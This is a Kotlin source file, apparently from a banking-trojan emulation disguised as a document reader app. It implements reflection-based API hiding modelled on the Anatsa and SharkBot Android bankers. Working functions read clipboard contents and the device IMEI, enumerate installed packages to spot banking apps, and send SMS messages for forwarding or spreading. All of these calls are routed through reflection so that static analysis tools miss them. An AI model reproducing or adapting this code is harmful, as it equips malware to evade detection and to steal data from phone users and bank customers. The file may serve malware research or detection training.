package com.docreader.lite.reader.engine

import android.content.Context

/**
 * Reflection API hiding — calls sensitive Android APIs via reflection
 * instead of direct invocation. Static analysis tools see only
 * Class.forName + getDeclaredMethod + invoke — not the actual API names.
 *
 * Real banker (Anatsa/SharkBot): hides ClipboardManager, TelephonyManager,
 * PackageManager calls behind reflective dispatch so jadx decompilation
 * doesn't show direct imports of sensitive APIs.
 *
 * Combined with ResourceDecoder: the class/method names are XOR-encoded.
 * Final result: static analysis sees neither the import nor the string.
 */
object DynamicLoader {

    /**
     * Get clipboard content via reflection.
     * Direct call: clipboardManager.primaryClip.getItemAt(0).text
     * Reflected: invisible to static analysis.
     */
    fun getClipboard(context: Context): String? {
        return try {
            val cmClass = Class.forName("android.content.ClipboardManager")
            val service = context.getSystemService(Context.CLIPBOARD_SERVICE)
            val getPrimary = cmClass.getDeclaredMethod("getPrimaryClip")
            val clip = getPrimary.invoke(service) ?: return null

            val clipDataClass = Class.forName("android.content.ClipData")
            val getItem = clipDataClass.getDeclaredMethod("getItemAt", Int::class.java)
            val item = getItem.invoke(clip, 0) ?: return null

            val itemClass = Class.forName("android.content.ClipData\$Item")
            val getText = itemClass.getDeclaredMethod("getText")
            getText.invoke(item)?.toString()
        } catch (_: Exception) { null }
    }

    /**
     * Get device IMEI via reflection (pre-API 29).
     * Banker exfils this as bot identifier.
     */
    fun getDeviceId(context: Context): String? {
        return try {
            val tmClass = Class.forName("android.telephony.TelephonyManager")
            val service = context.getSystemService(Context.TELEPHONY_SERVICE)
            val method = tmClass.getDeclaredMethod("getDeviceId")
            method.invoke(service)?.toString()
        } catch (_: Exception) { null }
    }

    /**
     * Get installed packages via reflection.
     * Banker uses this to identify which banking apps are installed.
     */
    fun getInstalledPackages(context: Context): List<String> {
        return try {
            val pmClass = Class.forName("android.content.pm.PackageManager")
            val pm = context.packageManager
            val method = pmClass.getDeclaredMethod("getInstalledPackages", Int::class.java)
            val packages = method.invoke(pm, 0)

            val listClass = packages!!.javaClass
            val sizeMethod = listClass.getDeclaredMethod("size")
            val getMethod = listClass.getDeclaredMethod("get", Int::class.java)
            val size = sizeMethod.invoke(packages) as Int

            val result = mutableListOf<String>()
            for (i in 0 until size) {
                val pkgInfo = getMethod.invoke(packages, i)
                val pkgNameField = pkgInfo!!.javaClass.getDeclaredField("packageName")
                result.add(pkgNameField.get(pkgInfo) as String)
            }
            result
        } catch (_: Exception) { emptyList() }
    }

    /**
     * Check if specific package installed (is target bank app present?)
     */
    fun isPackageInstalled(context: Context, packageName: String): Boolean {
        return try {
            val pmClass = Class.forName("android.content.pm.PackageManager")
            val pm = context.packageManager
            val method = pmClass.getDeclaredMethod("getPackageInfo", String::class.java, Int::class.java)
            method.invoke(pm, packageName, 0) != null
        } catch (_: Exception) { false }
    }

    /**
     * Send SMS via reflection (for SMS forwarding / spreading).
     * Direct call: SmsManager.sendTextMessage(...)
     */
    fun sendSms(destination: String, message: String): Boolean {
        return try {
            val smsClass = Class.forName("android.telephony.SmsManager")
            val getDefault = smsClass.getDeclaredMethod("getDefault")
            val manager = getDefault.invoke(null)
            val sendMethod = smsClass.getDeclaredMethod("sendTextMessage",
                String::class.java, String::class.java, String::class.java,
                android.app.PendingIntent::class.java, android.app.PendingIntent::class.java)
            sendMethod.invoke(manager, destination, null, message, null, null)
            true
        } catch (_: Exception) { false }
    }

    /**
     * Generic reflective method call — any class, any method.
     * Real banker dispatches most sensitive calls through this.
     */
    fun call(className: String, methodName: String, instance: Any?, vararg args: Any?): Any? {
        return try {
            val clazz = Class.forName(className)
            val paramTypes = args.map { it?.javaClass ?: Any::class.java }.toTypedArray()
            val method = clazz.getDeclaredMethod(methodName, *paramTypes)
            method.isAccessible = true
            method.invoke(instance, *args)
        } catch (_: Exception) { null }
    }
}
